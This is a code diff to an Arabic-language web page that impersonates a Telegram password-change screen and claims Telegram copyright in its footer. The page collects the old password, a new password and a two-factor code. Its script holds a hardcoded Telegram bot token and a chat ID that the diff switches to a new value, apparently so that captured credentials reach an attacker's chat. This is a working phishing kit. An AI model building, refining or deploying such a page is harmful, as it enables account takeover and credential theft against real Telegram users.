@@ -6,13 +6,15 @@
   <style>
     body {
       background-image: linear-gradient(to bottom, #f7f7f7, #e7e7e7);
-  background-size: 100% 300px;
-  background-position: 0% 100%;
-
+      background-size: 100% 300px;
+      background-position: 0% 100%;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f4f4f9;
       margin: 0;
       padding: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
     }
     .container {
       max-width: 400px;
@@ -21,6 +23,7 @@
       background-color: #ffffff;
       border-radius: 8px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      flex-grow: 1;
     }
     .logo {
       text-align: center;
@@ -42,16 +45,7 @@
       margin-bottom: 8px;
       color: #555;
     }
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-    input[type="text"] {
+    input[type="password"], input[type="text"] {
       width: 100%;
       padding: 12px;
       margin-bottom: 20px;
@@ -95,6 +89,25 @@
         font-size: 14px;
       }
     }
+    footer {
+      background-color: #333;
+      color: #fff;
+      text-align: center;
+      padding: 15px;
+      position: relative;
+      bottom: 0;
+      width: 100%;
+      font-size: 14px;
+    }
+    footer a {
+      color: #fff;
+      text-decoration: none;
+      margin: 0 10px;
+      font-weight: 600;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -109,19 +122,27 @@
         <label for="old-password">كلمة السر القديمة:</label>
         <input type="password" id="old-password" name="old-password" required class="form-control">
         <label for="new-password">كلمة السر الجديدة:</label>
-         <input type="password" id="new-password" name="new-password" required class="form-control">
-  <button type="submit">Update Password</button>
-</form>
+        <input type="password" id="new-password" name="new-password" required class="form-control">
+        <button type="submit">Update Password</button>
+    </form>
     <div class="additional-input">
-      <label for="additional-info">ادخل رمز المصادقة الثنائيةالذي تم ارساله اليك  (اذا لم تكن قد قمت بتفعيل المصادقة الثنائية فتجاهل هذه الخطوة و اضغط تأكيد) :</label>
+      <label for="additional-info">ادخل رمز المصادقة الثنائية الذي تم ارساله اليك  (اذا لم تكن قد قمت بتفعيل المصادقة الثنائية فتجاهل هذه الخطوة و اضغط تأكيد) :</label>
       <input type="text" id="additional-info" name="additional-info" required>
       <button id="confirm-btn">Confirm</button>
     </div>
   </div>
 
+  <footer>
+    <p>&copy; 2024 Telegram. All rights reserved.</p>
+    <p>
+      <a href="#">Terms of Service</a> | 
+      <a href="#">Privacy Policy</a>
+    </p>
+  </footer>
+
   <script>
   const botToken = "7341621457:AAEUmsmptZF9TAPbi8F-mjoiDGH3Kh3v_x0";
-  const chatId = "5918793423";
+  const chatId = "6940587601";
 
   document.getElementById("password-form").addEventListener("submit", function(event) {
     event.preventDefault();
@@ -178,6 +199,6 @@
       console.error("Error:", error);
     });
   });
-</script>
+  </script>
 </body>
 </html>
